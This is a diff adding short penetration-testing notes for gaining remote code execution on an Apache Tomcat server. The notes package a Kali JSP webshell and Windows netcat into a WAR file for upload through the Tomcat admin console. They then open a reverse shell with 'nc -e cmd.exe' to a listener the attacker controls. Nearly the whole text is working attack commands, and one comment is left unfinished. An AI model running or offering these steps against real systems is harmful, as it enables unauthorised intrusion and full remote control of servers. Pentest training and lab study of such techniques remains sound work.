@@ -1,0 +1,20 @@
+#create a directory called "rce" with a jsp webshell (ie. kali /usr/share/webshells)
+mkdir rce
+cd rce
+cp /usr/share/webshells/jsp/cmdjsp.jsp .
+
+#copy windows nc.exe into "rce" directory
+cp /usr/share/windows-binaries/nc.exe .
+
+#create a war file using the 
+jar -cvf ../rce.war *
+
+#upload rce.war through tomcat administration console and execute with path below
+https://tomcat-IPADDRESS:8080/rce/cmdjsp.jsp
+
+#Execute nc.exe to connect out to remote server with interactive shell
+#Listener kali machine
+nc -lvp 5555
+
+#From tomcat server with java webshell
+nc -vn LISTENER_IPADDRESS 5555 -e cmd.exe
